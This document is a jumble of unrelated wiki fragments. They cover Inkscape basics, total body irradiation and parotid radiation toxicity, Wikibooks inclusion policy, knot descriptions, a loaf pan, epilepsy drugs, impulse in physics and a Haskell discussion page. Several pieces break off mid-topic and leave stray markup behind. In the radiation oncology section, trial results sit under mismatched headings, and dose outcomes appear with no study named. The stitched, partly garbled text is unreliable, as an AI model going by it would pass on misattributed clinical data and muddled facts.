[[Image:Bitmap_VS_SVG.svg|300px|thumb|Scaling a bitmap and a SVG drawings makes the differences appear.]]

A vector object is composed of edit enabled path(s) and geometrical elements based on vector (x/y) coordinate values. This is very different from raster (or bitmap) images, which are composed from a grid (bitmap) of colored squares. Bitmaps are inherently &quot;pixellated&quot; when scaled larger (zoomed in), while vectors can be scaled to any size, and won't display any pixelized objects.

Some graphic editor programs, such as the GIMP, are known as bitmap or raster editors. With Inkscape, you can create and edit vector graphics, and save them as SVG (Scalable Vector Graphics) files or 'save as' over 15 graphic editor based file formats. SVG is an open standard designed by the World Wide Web Consortium (W3C), that uses XML to create graphic based objects.

== The Graphic User Interface (GUI) ==
When you load Inkscape you will see the following:
[[Image:Inkscape(main_window).png|thumb|175px|right|Inkscape's User Interface]]
Here are some quick explanations of what each button does:
Select and Transform Objects (F1):
From this option, you can, select, move, scale, rotate, and skew objects
Edit Path nodes or control handles (F2)
This tool is designed for manipulating the geometry of objects
Zoom in or Out(F3)
Allows you to access a wide set of zoom operations
Create Rectangles or Squares(F4)
A tool for creating and manipulating rectangles, squares, circles, and ellipses

==Overview==
*Goals of TBI:
**Immunosuppression - lymphocyte elimination to allow grafting of donor bone marrow
**Eradication of malignant cells - leukemia, lymphoma, rarely solid tumors
**Eradication of cells with genetic disorders - Fanconi's anemia, thalassemia major, Wiskott-Aldritch syndrome
*Benefit over chemo:
**No &quot;sanctuary&quot; sites (e.g. testes, brain)
**Delivered dose is independent of blood supply
**Delivered dose is independent of renal and hepatic function
**No cross-resistance with other agents
**Dose can be homogeneous, and tailored to &quot;boost&quot; areas at risk and &quot;spare&quot; more sensitive organs
*TBI dose required for adequate immunosuppression is high, so typically a combined chemo-TBI approach is used
**Cyclophosphamide has been used commonly; Etoposide has been used increasingly in ALL
**There is no randomized data, but fractionated TBI is typically given after cyclophosphamide
*There have been efforts to eliminate TBI from the conditioning regimen, because TBI was seen as one of the major causes of transplant-related mortality. Also, the risk of long-term toxicity such as secondary malignancies, pneumonitis, impaired growth, and endocrine dysfunction was worrisome. A meta-analysis suggested that survival was comparable between CY-TBI and BU-CY regimens, with better toxicity profile for the cyclophosphamide-TBI strategy
*Acute effects of whole-body irradiation are also important to understand from a radiation protection perspective


==TBI vs. Chemo-ablation only==
*For patients undergoing allogeneic bone marrow transplant, cyclophosphamide 120 mg/kg + TBI has been the standard of care since 1970's
*In effort to decrease some of the long-term complications of TBI, efforts were made to replace it with chemotherapy only. Cyclophosphamide + busulfan was the typical combination
*5 trials in 1980's randomized patients to CY-TBI (or Etoposide-TBI) vs. BU-CY. In one meta-analysis, TBI-based regimens were as good for survival as BU-CY, with lower incidence of veno-occlusive disease. In the other meta-analysis, focusing on myeloid leukemia patients only, the long-term survival and toxicity was comparable, with perhaps small survival benefit to CY-TBI 
*A reasonable fractionation schedule would be 12 Gy in 6 fractions daily, at 10 cGy/min


===Meta-analysis===
*'''Meta-analysis, 2001''' PMID 11739158 -- &quot;Busulfan plus cyclophosphamide compared with total-body irradiation plus cyclophosphamide before marrow transplantation for myeloid leukemia: long-term follow-up of 4 randomized studies.&quot; (Socie G, Blood. 2001 Dec 15;98(13):3569-74.)
**4 trials (GEGMO, Nordic, SFGM, Fred Hutchinson), subset AML/CML patients (488) analyzed. Mean F/U 7 years
**CML: no difference between BUCY and CY-TBI. Projected 10-year OS 65% vs. 63%
**AML: Projected 10-year OS 51% vs. 63% (NS)
**Toxicity: CML: CY-TBI increased risk of cataracts, BUCY increased risk of irreversible alopecia, otherwise comparable. Long-term complications mostly result of chronic GVHD
**Conclusion: Comparable long-term outcomes, with some (NS) benefit for CY-TBI in AML

*'''Meta-analysis, 1998''' PMID 9733266 -- &quot;Survival, disease-free survival and adverse effects of conditioning for allogeneic bone marrow transplantation with busulfan/cyclophosphamide vs total body irradiation: a meta-analysis.&quot; (Hartman AR, Bone Marrow Transplant. 1998 Sep;22(5):439-43.)
**5 trials. 
**Outcome: OS and DFS better with TBI, but NS (p=0.09)
**Toxicity: More veno-occlusive disease with BUCY (HR 2.5, SS), otherwise no difference
**Conclusion: TBI-based regimens at least as good for survival, and less BVOD


===Randomized===
*'''Fred Hutchinson''' (1988-1992) -- CML; CY-TBI vs. BU-CY
**Randomized. 142 patients with CML in chronic phase, treated with cyclophosphamide 120 mg/kg + TBI 12/6 vs. busulphan 64 mg/kg + cyclophosphamide 120 mg/kg

Median F/U 7.7 years
***9-year outcome: OS: BUCY 73% vs. CY-TBI 65% (NS); relapse 19% vs. 22% (NS)
***Non-relapse mortality: 20% vs. 25% (NS)
***Conclusion: BU-CY better tolerated, and comparable efficacy
**'''3-years, 1994''' PMID 8081005 -- &quot;Marrow transplantation for chronic myeloid leukemia: a randomized study comparing cyclophosphamide and total body irradiation with busulfan and cyclophosphamide.&quot; (Clift RA, Blood. 1994 Sep 15;84(6):2036-43.
***3-year outcome: No difference in OS (80%), relapse (13%) or EFS (CY-TBI 68% vs. BUCY 71%)
***Toxicity: No difference in VOD; more creatining elevations and acute GVHD in CY-TBI group
***Conclusion: BU-CY better tolerated, similar OS and relapse

*'''SFGM''' (French)(1988-1991) -- CML; CY-TBI vs. BU-CY
**Randomized. 19 centers. 120 patients with CML, in first chronic phase. Treated with cyclophosphamide 120 mg/gk + TBI vs. busulfan 16 mg/kg + cyclophosphamide 120 mg/kg.

**'''7-years, 1999''' PMID 10090927 -- &quot;Increased risk of chronic graft-versus-host disease, obstructive bronchiolitis, and alopecia with busulfan versus total body irradiation: long-term results of a randomized trial in allogeneic marrow recipients with leukemia. Nordic Bone Marrow Transplantation Group.&quot; (Ringden O, Blood. 1999 Apr 1;93(7):2196-201.)
***7-year outcome: DFS early disease 68% vs. 66% (NS); DFS advanced disease 17% vs. 49% (SS); OS early disease 72% vs. 67% (NS; OS advanced disease 17% vs. 49% (SS)
***Toxicity: VOD of liver: BUCY 12% vs. TBI 1% (SS); hemorrhagic cystitis 32% vs. 10% (SS); acute GVHD comparable but chronic GVHD 59% vs. 47% (SS). GVHD death 22% vs. 3% (SS). Obstructive bronchiolitis 26% vs. 5% (SS). Cataracts 6% vs. 20% (SS).
***Transplant mortality: early disease 21% vs. 12%; advanced disease 64% vs. 22% (SS)

***Transplant mortality: 12 Gy 12% vs. 17.75 Gy 32% (SS); moderate/severe GVGH 21% vs. 48% (SS)
***Conclusion: Higher TBI dose reduced probability of relapse but did not improve survival; significantly higher toxicity with higher dose

==Cranial boost==
*'''U. Michigan''' (1994-2003) - PMID 15978741, 2005 &amp;mdash; &quot;Utility of cranial boost in addition to total body irradiation in the treatment of high risk acute lymphoblastic leukemia.&quot; Alexander BM et al. Int J Radiat Oncol Biol Phys. 2005 Nov 15;63(4):1191-6.
**Purpose: Evaluate role of cranial boost.
***Retrospective. 67 pts. High-risk pts treated with or without a cranial boost in addition to TBI prior to BMT. All received chemotherapy for conditioning. TBI was most commonly 2 Gy BID to 12 Gy or 2.5 Gy qd to 10 Gy. Cranial boost given in 39% of pts, median dose 11 Gy
**Conclusion: cranial boost not associated with lower CNS relapse rate.


==Toxicity==
*'''Gustave Roussy, 1993''' (France) PMID 8449718 -- &quot;Prospective study of the clinical symptoms of therapeutic whole body irradiation.&quot; (Chaillet MP, Health Phys. 1993 Apr;64(4):370-4.)
**Prospective. 31 patients receiving 10 Gy in 4 hours TBI, prior to high dose cyclophosphamide for BMT.
**Acute side effects: 90% nausea (despite ondansetron), 80% vomiting, 42% headaches, early (during TBI) xerostomia 61%, temperature peak to 40.8C during first 6 hours, parotitis 74% during first 24 hours


===Acute Parotitis===
*''Please see the [[Radiation_Oncology/Toxicity/Head_%26_Neck#Acute_Parotitis|Acute Parotitis Toxicity]] section for more information

* Rapid destruction of serous cells by apoptosis; cell membrane damage as early as 2 hours after RT
* Increase in serum amylase even after 0.5 Gy; typically dose-dependent. Peak (up to 50x) 1-2 days after RT. Return to normal in 5-6 days. 
* Frequently with associated parotid gland swelling, dry mouth, and loss of taste


==Radiation Protection==
*Effects related to whole body irradiation, typically as a result of nuclear accidents or nuclear warfare. Please see [http://www.remm.nlm.gov/ Radiation Event Medical Management] webpage at the U.S. Department of Health &amp; Human Services
*Prodromal Syndrome
**Threshold 1 Gy

**Survival unlikely &gt;8 Gy
**Hematopoietic syndrome (3-8 Gy)
**Gastrointestinal syndrome (10-50 Gy)
**CNS syndrome (&gt;50 Gy)
*Hematopoietic syndrome
**Depression of blood components (leukocytes drop -&gt; granulocytes spike then drop -&gt; platelets drop) in 2-3 weeks; death in 1-2 months
**Symptoms: chills, fatigue, petechial hemorrhages, mouth ulceration, epilation
**Treatment
***Careful nursing, prophylactic antibiotics if ANC &lt;0.5, cytokines/bone marrow growth factors
***Bone marrow transplant somewhat controversial at 8-10 Gy; only 1 BMT successful in saving a life. BMT &gt;10 Gy resulted in death anyway by GI syndrome
*GI syndrome
**Death of intestinal stem cells -&gt; latency of 4-5 days before replacement for mature cells not available; death in 3-10 days
**Symptoms: nausea, vomiting, diarrhea, fatigue, dehydration
**Mean survival time independent of dose
*CNS syndrome
**Symptoms: Severe nausea/vomiting/diarrhea in minutes, disorientation, respiratory distress, visual symptoms, seizures, coma
**Mean survival time dependent on dose</text>

This guide is going to be a basic guide for what is and is not considered a &quot;textbook&quot; around here. for the complete policy about Wikibooks inclusion criteria, see [[Wikibooks:What is wikibooks]]. 

== Define &quot;Books&quot; and &quot;Textbooks&quot; ==

According to any standard dictionary definition, a &quot;book&quot; is a work of text that is printed on paper and bound together. Obviously, any &quot;books&quot; on Wikibooks don't fit this definition and aren't traditional books. However, we call our content &quot;books&quot; because they contain instructional material that is written with a specific reading order. 

The only books that belong on Wikibooks are &quot;textbooks&quot;, although the definition of that word needs to be expanded because Wikibooks is a non-traditional book publishing medium. Textbooks are ''instructional'' resources that are used to teach information to a specific target audience. Unlike traditional textbooks which are aimed at school students, a Wikibooks textbook can be used to teach all sorts of people including young children, school children, college students, working professionals, hobbyists, and other self-learners. 

== What about other books? ==

There are all sorts of books in this world, and unfortunately the majority of them do not belong on Wikibooks. Here are some examples of types of books that do not belong here:

=== Dictionary and Thesaurus ===

A dictionary and a thesaurus are books, but they are not instructional textbooks. If you are interested in writing a dictionary or a thesaurus, you should visit [[Wikt:Main Page|Wiktionary]] instead. A textbook is allowed to contain a glossary, however.

=== Encyclopedia ===

An encyclopedia is a book, but we don't allow encyclopedias on Wikibooks. If you are interested in writing encyclopedia articles, you should visit [[w:Main Page|Wikipedia]] instead. A ''Macropedia'' is a small version of an encyclopedia, that contains a small collection of encyclopedia articles on a particular subject. In Wikibooks, we don't like Macropedias, but we can be tolerant of a book that acts like a macropedia for a while, until it is improved.

=== Literature ===

Literature written by famous authors is typically studied in a classroom environment, but these kinds of books are not instructional. Literature, such as original works by famous authors, is not allowed here on Wikibooks. However, because we allow instructional material, we do allow annotated texts: original source literature with the addition of instructional material and critical analysis. If you are interested in reading or uploading orginal works of literature, visit [[s:Main Page|Wikisource]].

=== Fiction ===

Wikibooks is not for fiction, because fiction is not instructional. In some cases, such as books for young children, instructional material can be presented as allegory or fable, in order to keep the material interesting.

=== Travel Guides ===

Travel is certainly interesting, although guides about travel are not instructional and do not belong on Wikibooks.

=== Videogame Manuals and Guides ===

Videogame guides are not instructional, and do not belong on Wikibooks. However, it is possible to write instructional books about videogames, such as books about designing and programming videogames, critical analyses of videogames, etc.</text>

&lt;big&gt;'''Parotid Gland Radiation Toxicity'''&lt;/big&gt;


==Normal Tissue Tolerance==
*Mean MTD dose: 25 Gy; expect recovery to pre-treatment within 1-2 years, but can continue to improve even at 5 years
*Emami tables: TD5/5 32 Gy; TD50/5 46 Gy


*'''Michigan''' 
**'''2007''' PMID 17141973 -- &quot;The impact of dose on parotid salivary recovery in head and neck cancer patients treated with radiation therapy.&quot; (Li Y, Int J Radiat Oncol Biol Phys. 2007 Mar 1;67(3):660-9. Epub 2006 Dec 4.)
***Prospective. 142 patients treated with 3D-conformal or IMRT. 266 parotid glands flow rates (stimulated and unstimulated) measured prior, and at 1, 3, 6, 12, 18, and 24 months
***Outcome: high dose results in less saliva. Largest reduction at 1-3 month after RT, followed by gradual recovery
***Stimulated flow: mean dose &lt;24 Gy - recovery to pretreatment at 12 months vs. mean dose &gt;30 Gy does not recover to normal
***Unstimulated flow: mean dose 25 Gy - recover to 86% pretreatment vs. mean dose &gt;40 Gy recovery to 30% pretreatment
**'''1999''' (1994-1997) PMID 10524409 -- &quot;Dose, volume, and function relationships in parotid salivary glands following conformal and intensity-modulated irradiation of head and neck cancer.&quot; (Eisbruch A, Int J Radiat Oncol Biol Phys. 1999 Oct 1;45(3):577-87.)
***Prospective. 88 patients treated with 3D-conformal or IMRT. 152 parotid stimulated and unstimulated flow rates measured prior and at 1, 3, 6, 12 months after completion. NTCP endpoint defined as flow rate &lt;=25% at 12 months
***Mean MTD: 24 Gy for unstimulated and 26 Gy for stimulated, returned to 76% and 114% of pre-treatment respectively. 
***Higher mean dose: little saliva with no recovery over time
***Partial volume thresholds: 67% to 15 Gy, 45% to 30 Gy, 24% to 45 Gy (correlated highly to mean dose)
***NTCP parameters: TD50 = 28.4 Gy, n=1, m=0.18

*'''Washington University, 2005''' PMID 15990009 -- &quot;Dose-volume modeling of salivary function in patients with head-and-neck cancer receiving radiotherapy.&quot; (Blanco AI, Int J Radiat Oncol Biol Phys. 2005 Jul 15;62(4):1055-69.)
**Prospective. 65 patients, treated with IMRT (45) or 3D conformal (20). Salivary flow measured prior, and at 6, 12 months. Xerostomia defined as &lt;25% pretreatment flow
**Final model: mean dose 25.8 Gy reduces single gland flow to 25%. Function lost ~5%/1 Gy of mean dose

*'''Utrecht''' (Netherlands) 
**'''2005''' PMID 15964708 -- &quot;A comparison of mean parotid gland dose with measures of parotid gland function after radiotherapy for head-and-neck cancer: Implications for future trials.&quot; (Roesink JM, Int J Radiat Oncol Biol Phys. 2005)
***Conclusion: &quot;Stimulated flow measurements using Lashley cups, with a complication defined as flow &lt;/=25% of the preradiotherapy output, correlated best with the mean parotid gland dose.&quot;
**'''2005''' PMID 15936542 -- &quot;Long-term parotid gland function after radiotherapy.&quot; (Braam PM, Int J Radiat Oncol Biol Phys. 2005)
***Conclusion: &quot;Salivary output can still recover many years after RT. At 5 years after RT, we found an increase in the salivary flow rate of approximately 32% compared with at 12 months after RT.&quot;



==Acute Parotitis (Sialadenitis)==
*Rapid destruction of acinar cells by apoptosis; cell membrane damage as early as 2 hours after RT
*Increase in serum amylase produced by acinar cells even after 0.5 Gy (and typically after first or second treatment); appears to be dose-dependent. Peak (up to 50x) 1-2 days after RT. Return to normal in 5-6 days. Frequently associated parotid gland swelling, dry mouth, and loss of taste
*Salivary (parotid) serum amylase is a very rapid and sensitive bio-indicator of radiation exposure; no change in pancreatic serum amylase
*Treatment is with aspirin or NSAIDs; symptoms typically resolve within 48 hours


===After [[Radiation_Oncology/TBI#Toxicity|TBI]]===
*'''Florence, 2001''' (Italy) PMID 11776255 -- &quot;Proposal for biochemical dosimeter for prolonged space flights.&quot; (Becciolini A, Phys Med. 2001;17 Suppl 1:185-6.)
**Evaluated different doses per fraction and fractionation schedules. Direct correlation between absorbed dose, and serum amylase (synthesized by acinar cells) and tissue polypeptide antigen (synthesized by ductal cells)
**Elevation after I-131 also correlates to dose 

*'''MD Anderson, 1992''' PMID 1620884 -- &quot;Post-irradiation hyperamylasemia as a biological dosimeter.&quot; (Dubray B, Radiother Oncol. 1992 May;24(1):21-6.)
**Prospective. 31 patients with TBI, 40 patients with H&amp;N RT, and 22 patients with pancreatic RT
**Outcome: significant increase in serum amylase at doses &gt;0.5 Gy; sigmoid function of dose and maximum amylasemia
**Conclusion: Post-RT hyperamylasemia is good for triage of accidentally irradiated patients

*'''Karolinska, 1991''' (Sweden) PMID 1716901 -- &quot;Isoamylase levels in bone marrow transplant patients are affected by total body irradiation and not by graft-versus-host disease.&quot; (Brattstrom C, Transpl Int. 1991 Jun;4(2):96-8.)
**Pre-TBI: Mean serum amylase 3.2 (50% salivary, 50% pancreatic).
**Post-TBI: Mean serum amylase 100.3 (90% salivary, 10% pancreatic). All patients clinical symptoms of parotitis, none pancreatitis
**Time course: Peak within 24 hours, normalized in 5 days, then subnormal for 3 weeks
**Dose: 7.5 Gy at 26cGy/min peak 32 vs. 10 Gy at 4 cGy/min peak 76 (SS). 6 month amylase higher after 7.5 Gy regimen

*'''Lange, 1990''' (Germany) PMID 1700482 -- &quot;Increased serum amylase in patients after radiotherapy as a probable bioindicator for radiation exposure.&quot; (Hofmann R, Strahlenther Onkol. 1990 Oct;166(10):688-95.)
**Prospective. 41 patients with TBI or H&amp;N RT.
**Dose-dependent amylase increase up to 80x; pancreatic proteins contribute minimally
**Conclusion: Serum amylase bioindicator for radiation exposure

*'''Royal Marsden, 1986''' (UK) PMID 2420486 -- &quot;Salivary amylase and pancreatic enzymes in serum after total body irradiation.&quot; (Junglee D, Clin Chem. 1986 Apr;32(4):609-10.)
**Prospective. 6 patients given TBI (high dose cyclophosphamide followed by ~10 Gy RT). Measured pancreatic enzymes (trypsin, amylase, lipase) and salivary amylase
**Parotitis: Salivary amylase increased by up to 50x, peaking first day after RT. Associated with clinical parotitis. Resolved by 48 hours. Xerostomia and altered taste persisted for up to 6 months
**Pancreatitis: Pancreatic enzymes increased to much smaller degree, and inconsistently. No associated clinical pancreatitis
**Conclusion: Parotitis consistent after TBI

*'''Guildford, 1982''' (UK) PMID 6178460 -- &quot;Changes in serum amylase and its isoenzymes after whole body irradiation.&quot; (Barrett A, Br Med J (Clin Res Ed). 1982 Jul 17;285(6336):170-1.)
**Prospective. 12 patients. Amylase levels evaluated
**Total serum amylase: rapid rise within 12 hours of RT; maximum at 36 hours, normalize by 6 days. Majority from salivary damage, with much smaller pancreatic component. Clinically associated with swelling of the parotid gland, dry mouth, and loss of taste

*'''1981''' PMID 6164661 -- &quot;Early membrane injury in lethally irradiated salivary gland cells.&quot; (El-Mofty SK, Int J Radiat Biol Relat Stud Phys Chem Med. 1981 Jan;39(1):55-62.)
**Rat experiments. 2-20 Gy to neck. Light and electron microscopy.
**Parotid glands: acinar cell necrosis 12-24 hours after RT. &gt;2x increase in serum amylase prior to cell necrosis. As early as 2 hours, signs of cell membrane injury
**Submandibular and sublingual glands were resistant

*'''1973''' PMID 4699791 -- &quot;Radiation-induced change in serum and urinary amylase levels in man.&quot; (Chen IW, Radiat Res. 1973 Apr;54(1):141-51.)
**In the field, 1-3 Gy to people can produce 12x increase in serum amylase activity


===After [[Radiation_Oncology/Palliation/Brain_Metastases#Treatment_Toxicity|Whole Brain RT]]===
*'''1980''' PMID 6155101 -- &quot;Acute parotitis and hyperamylasemia following whole-brain radiation therapy.&quot; (Cairncross JG, Ann Neurol. 1980 Apr;7(4):385-7.)
**Parotitis observed in 4 patients. Previously unreported
**Acute symptoms included fever, dry mouth, pain, swelling, and tenderness. Hyperamylasemia. Among 10 patients receiving WBRT, 8 had serum amylase elevations without symptoms


===After [[Radiation_Oncology/Hodgkin|mantle field]]===
*'''Fox Chase, 1995''' (1967-1993) No PMID [http://www3.interscience.wiley.com/cgi-bin/abstract/112714843/ABSTRACT?CRETRY=1&amp;SRETRY=0|Publisher Abstract] -- &quot;Acute parotitis during mantle irradiation: Incidence, onset, duration, and treatment&quot; (Fein D, Radiation Oncology Investigations, Volume 2, Issue 6 , Pages 291 - 294, 1995)
**Retrospective. 126 patients treated with mantle for HL, up to external acoustic meatus.
**Clinical parotitis: 5%; palpable swelling in 3% all during first week. Treated with aspirin, and symptoms resolved within 48 hours. If no treatment, can persist for 5 days


===After I-131 Administration===
*'''Royal Marsden, 2007''' PMID 17305259 -- &quot;Salivary gland toxicity after radioiodine therapy for thyroid cancer.&quot; (Hyer S, Clin Oncol (R Coll Radiol). 2007 Feb;19(1):83-6.)
**Prospective. 76 patients treated with I-131 for thyroid CA.
**Symptoms: 26% toxicity - 15% within 48 hours (sialadenitis), 11% after 3 months (xerostomia); 5 patients in database with chronic salivary gland swelling (up to 23 years)
**Conclusion: Salivary gland compromise frequent

*'''UCLA, 1984''' PMID 6737074 -- &quot;Sialadenitis following I-131 therapy for thyroid carcinoma: concise communication.&quot; (Allweiss P, J Nucl Med. 1984 Jul;25(7):755-8.)
**Retrospective. 87 patients receiving I-131 for thyroid Ca
**Outcome: 11% developed acute and/or chronic sialadenitis of the parotid (5 patients) or submandibular (4 patients) or both
**Conclusion: This complication occurs more often than has been appreciated

      <text xml:space="preserve">Please fix this page.

it is a blatant attempt to promote specific video cameras.  Slow motion film is the format that has been successfully used for the past 50 years and there is an incredible legacy of slow motion cinematography that has actually increased the quality of all of our lives. Did you know that slow motion film cinematography of a 747 engine being blown up was used to increase airplane safety?  Seat belt safety was chronicled on slow motion FILM.

it wasn't done on a varicam or a band pro cam or digital cam.  Since I have a bias towards the truth of film, can someone from wikipedia just make this page right.

Film has a 50 year head start on the digital guys and the way the page is constructed makes it seem like film is an afterthought.</text>

| use = The Butterfly Loop has a high breaking strength and is regarded by mountaineers as one of the strongest knots to attach climbers to the middle of a rope, such that they have room to move around even when the main rope goes tight, and they can be supported in either direction from the main rope. The loop is typically attached to a climbing harness by carabiner.

It can also be used to isolate a worn section of rope, where the knot is tied such that the worn section is used for the center of the loop.

| image_caption=A fully interwoven diagonally opposed Carrick bend
| image2 = Carrick-bend-seized-ABOK-1439.jpg
| name=Carrick bend
| use = 
The Carrick bend is used for joining two lines.  It is particularly appropriate for very heavy rope or cable that is too large and stiff to easily be formed into other common bends.  It will not jam even after carrying a significant load or being soaked with water. The Carrick bend's aesthetically pleasing interwoven and symmetrical shape has also made it popular for decorative purposes.

In the interest of making the Carrick bend easier to untie, especially when tied in extremely large rope, the ends may be seized to prevent the knot from collapsing when load is applied.  This practice also keeps the knot's profile flatter and can ease its passage over capstans or winches.

The ends are traditionally seized to their standing part using a Round seizing.  For expediency, a series of double constrictor knots, drawn very tight, may also be used.  When seizing the Carrick bend, ''both'' ends must be secured to their standing parts or the bend will slip.
| image2 = Carrick-bend-seized-ABOK-1439.jpg
| warnings = The Carrick bend is generally tied in a flat interwoven form shown above.  Without additional measures it will capsize (collapse) under load into a secure and stable, although bulky, form.  If the knot is allowed to capsize naturally under tension, considerable slippage of line through the knot can occur before tightening.  The knot should be upset carefully into the capsized form and worked up tight before actual use.

| name=Cat's paw
| image= catspawknot.png
| use = The Cat's paw  is used for connecting a rope to an object.  
* Attaching a rope to a hook (or to a post or rail where the load is perpendicular to the post) with more security than a simple girth hitch.
* Joining an eye to a ring.
* Strongly joining eyes in the ends of two lines, where there is access to the end of at least one line.

| tying_instructions =
;Method 1:
Form a bight in the middle of the line, and pull it back over itself like a girth hitch. This forms two loops, turned in opposite directions. Give each loop one more full turn in the direction that will tend to tighten it (the wrong direction will undo the loop completely). Pass both loops over the hook, rail or post and pull tight, taking care to push the bight up snugly against the turns.
;Method 2:
If working end of the line has an eye in it, and the standing end is accessible, the knot can be tied to a closed ring, another eye, or a rail with inaccessible ends, as follows. Pass the eye around the ring or rail, then pass the standing end through its own eye (this effectively forms a girth hitch). Then pass the standing end through the eye again, and pull up tight, taking care to push the bight up snugly against the turns.

When using the cat's paw to join two eyes, this process may be repeated several times to give several turns - as many as five in a fine fishing monofilament. Then when tightened, instead of pulling the bight up against the turns, both eyes are pulled equally, to make neat coils of turns in both eyes, meeting halfway between them.

A '''loaf pan''' is a deep rectangular pan used to bake quick breads (banana bread, zucchini bread, et al), yeast breads (white, wheat, rye, et al), and meatloaf. Loaf pans are commonly available in aluminum or stainless steel, with enameled cast-iron and non-stick silicon also available at higher price-points. Loaf pans are frequently sold based on the size of bread-loaf they would bake; 1lb, 1.5lb and 2lb loaf pants are the most common in the home kitchen, but larger models exist for use in restaurants and industrial kitchens.</text>

It is made similarly to a clove hitch but with one end passed under the other, forming an overhand knot under a riding turn.  It is a ''very'' effective knot for constructing a pilot's ladder, as it will not slip when tied around wooden rungs.

#Be sure the ends emerge between the two turns as shown.  Pull firmly on the ends to tighten.
|warnings = The Constrictor knot's severe bite, which makes it so effective, can damage or disfigure items it is tied around.

| name=Double sheet bend
| image= Double sheet bend.jpg
| use= 
The '''double sheet bend''' or '''double becket bend''' is a strong knot used to tie two ropes (usually of different thicknesses or rigidity) together. It is a doubled version of the sheet bend.
|tying_instructions =
To tie the double sheet bend, start by making a bight in the larger line. Pass the working end of the smaller line up through the bight, around behind the bight, and beneath the loop in the smaller line (that's a sheet bend). Then once again, pass the working end along the same path, around behind the bight and beneath the loop in the smaller line.
|warnings=As with the standard sheet bend, the two free ends should end up on the same side of the knot.  If they do not, a ''left-handed double sheet bend'' results, which is much weaker.

| name=Fisherman's knot
| use=
The '''Fisherman's knot''' is a specialized bend.  It consists of two overhand knots wrapped around each other.  It works well for joining thin, stiff, or slippery lines.

It requires little dexterity to tie, so is often used in stubborn materials.  When tightened, it becomes fairly compact, and the free ends can be cropped very close to the knot.  These qualities make it very useful for fishing line--it is less likely to jam a fishing rod than many other bends, and is easier to tie with cold, wet hands.

|tying_instructions=
To tie the fisherman's knot, lay the two ends to be tied alongside each other and facing opposite ways. Tie an overhand knot on the first rope and pass the second rope through the loop formed. Tighten the overhand knot, to prevent the line inside it from flopping around. Then tie another overhand knot on the second rope with the first rope passing through it.

'''Status epilepticus'''

'''Benzodiazepines (sedatives &amp; hypnotics)'''
Indication: More commonly used for the treatment of status epilepticus rather than maintenance treatment. For the pre-hospital treatment of status epilepticus, buccal midazolam (or alternatively, the less socially desirable rectal diazepam) is used. IV Diazepam is given at hospitals in conjunction with IV Phenytoin to stop seizures. 

MOA: The therapeutic effect of benzodiazepines in epilepsy is through acting on the benzodiazepine site of the GABA receptor which potentiate the binding of GABA to the GABA site on GABA A and B receptors (however the therapeutic effect is thought to be mostly due to the GABA A receptor) leading to the influx of Cl- ions to cause hyperpolarisation. The BZ site and GABA sites are on different subunits of the GABA receptor. By increasing GABA, neuronal firing is decreased, decreasing activation of nerves, causing the sedative, hypnotic and muscle relaxation effects.

Note: Benzodiazepines are recommended for short term use only (not more than a month) due to the potential of the individual of developing dependence, tolerance and withdrawal to the medication. The patient should be withdrawn slowly from the medication (dose titration) to avoid these effects. They should be used with caution in the elderly, due to altered pharmacokinetics in the elderly, are more susceptible to the sedative and hypnotic effects. This could lead to confusion and falls, however this practice point is more relevant in other uses of benzodiazepines, as it would be highly unlikely for a benzodiazepine to be used in long term use of controlling epilepsy.

While used for hospital treatment of status epilepticus, the patient should be monitored for signs of respiratory depression.


'''Maintenance treatment'''

More commonly used antiepileptics are Valproate, Carbamazepine and Lamotrigine in that order.

Things to note:
Valproate has been found to be effective in most types of epilepsy and is often considered as first line treatment.

Carbamazepine is first line treatment in partial seizures, simple or complex. It is often used as an alternative to Valproate, eg. when the patient cannot tolerate the sedative effects of Valproate.

Lamotrigine is a newer drug which has been found to be an effective alternative, however can sometimes cause a rash which can lead to a more serious rash known as Steven-Johnson's syndrome (a life threatening condition where the skin falls off.) Therefore, early signs of skin rash should be taken seriously as it is a common adverse effect. Lamotrigine is considered for treatment during pregnancy due to less incidence of teratogenic effects compared to other anti-epileptics. 


'''Epilepsy during pregnancy'''

A benefit risk assessment is important for the mother and child, and usually, the case is that there is more risk for both mother and child if the mother does not control her epilepsy during pregnancy. It is best that women with epilepsy who are wishing to get pregnant should have their epilepsy properly controlled before conceiving and have higher doses of folic acid supplements. However, should the woman learn that she is pregnant after the first trimester without preconception preparation, the teratogenic effects of more teratogenic anti-epileptics, eg. Valproate, would have already occurred and there is not benefit in switching anti-epileptics (if damage has occurred, 'the damage is already done' as the first trimester is when most of the development of the foetus occurs)

      <text xml:space="preserve">'''Impulse''' can be defined as Force x Time (i.e. the magnitude of a force multiplied by the time it acts for), and is measured in Ns (newton seconds).

If an impulse is applied to a body, the impulse is equal to the change in momentum of the object. This produces the impulse-momentum equation: Ft = mv - mu.

      <text xml:space="preserve">== Explain Confluence? ==
Should we note that reduction is confluent, or rather that it might be imaginable that it's not? Arguably, this is assumed intuitively and an explanataion only eats space but doesn't add additional insights. Unless there's either an informal proof or a good non-confluent example, I wouldn't mention confluence at all. --[[User:Apfelmus|apfe&lt;b&gt;&amp;lambda;&lt;/b&gt;mus]] 10:34, 20 June 2007 (UTC)

&lt;i&gt;
So far, we implicitely assumed that every sequence of reductions would yield the same normal form. After all, we're replacing equals by equals and the result should be the same. But &quot;equal&quot; only means that we can convert from one to the other by expanding function definitions (&lt;code&gt;square 3 &amp;rArr; 3*3&lt;/code&gt;) or abstracting a given expression into a function application (&lt;code&gt;3*3 &amp;rArr; square 3&lt;/code&gt;), there is no guarantee that always applying only one direction of the equivalence will lead to a unique normal form. Of course, intuition tells us that for expanding function applications, this should nevertheless be the case and we can in fact rely on the following

;Theorem: Every Haskell expression has at most one normal form, i.e. the order of reduction doesn't change the result.

This follows more or less from the [[w:Church-Rosser theorem]] stating that the untyped lambda-calculus is confluent. We will not proof this here, but to appreciate the result, we'll show an example of a term rewriting system that does not enjoy unique normal forms.

Show the example!
&lt;/i&gt;

: The confluence theorem is of interest when studying deeply lambda-calculus and reduction strategies of lambda-terms; however, it has a nontrivial part, mentioning that every 'terminating' sequence of reduction leads to the same normal form. But &lt;math&gt;(\lambda x y. x) 1 \Omega &lt;/math&gt; terminates only with a call-by-name strategy (like Haskell's one), not with a call-by-value one.
: Reduction order is also important for infinite data structures.
: So, what you say is correct as long as the reduction strategy is lazy.

== Supercombinators means Combinatory logic? ==

The page mentions supercombinators about GHC implementation. Are you talking about the ones in:
http://en.wikipedia.org/wiki/Combinatory_logic ?
